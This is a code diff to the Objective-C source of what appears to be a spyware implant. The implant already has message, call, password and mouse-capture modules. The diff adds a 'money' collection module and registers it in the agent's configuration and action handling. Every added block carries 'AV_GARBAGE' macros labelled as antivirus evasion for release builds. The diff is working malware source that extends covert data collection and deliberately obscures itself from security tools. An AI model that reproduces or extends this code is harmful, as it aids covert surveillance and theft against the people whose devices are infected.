@@ -37,6 +37,7 @@
 - (void)initMessagesModule: (NSDictionary *)aModule;
 - (void)initCallModule: (NSDictionary *)aModule;
 - (void)initPasswdModule: (NSDictionary *)aModule;
+- (void)initMoneyModule: (NSDictionary *)aModule;
 
 - (NSTimeInterval)calculateMsecFromMidnight:(NSString*)aDate;
 - (void)addProcessEvent: (NSDictionary *)anEvent;
@@ -1436,6 +1437,71 @@ typedef struct  {
   [data release];
   
   [pool release];
+}
+
+- (void)initMoneyModule: (NSDictionary *)aModule
+{
+    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    id enabled = AGENT_ENABLED;
+    NSArray *keys = nil;
+    NSArray *objects = nil;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_MONEY];
+    NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    if (status == nil || [status boolValue] == FALSE)
+        enabled = AGENT_DISABLED;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
+    keys = [NSArray arrayWithObjects: @"agentID",
+            @"status",
+            @"data",
+            nil];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    objects = [NSArray arrayWithObjects: type,
+               enabled,
+               MODULE_EMPTY_CONF,
+               nil];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
+    NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
+                                                           forKeys: keys];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
+    NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+    
+    [moduleConfiguration addEntriesFromDictionary: dictionary];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_008
+    
+    [mAgentsList addObject: moduleConfiguration];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
+    [moduleConfiguration release];
+    
+    [pool release];
 }
 
 - (void)initPasswdModule: (NSDictionary *)aModule
@@ -3079,6 +3145,13 @@ typedef struct {
       
       tmpAgentID = AGENT_PASSWORD;
   }
+  else if ([moduleName compare: ACTION_MODULE_MONEY] == NSOrderedSame)
+  {
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
+      tmpAgentID = AGENT_MONEY;
+  }
     
   // AV evasion: only on release build
   AV_GARBAGE_003
@@ -3702,7 +3775,14 @@ typedef struct {
           
           [self initPasswdModule: module];
       }
-      else if ([moduleType compare: @"mouse"] == NSOrderedSame) 
+      else if ([moduleType compare: MODULES_MONEY_KEY] == NSOrderedSame)
+      {
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
+          [self initMoneyModule: module];
+      }
+      else if ([moduleType compare: @"mouse"] == NSOrderedSame)
       {  
         // AV evasion: only on release build
         AV_GARBAGE_005
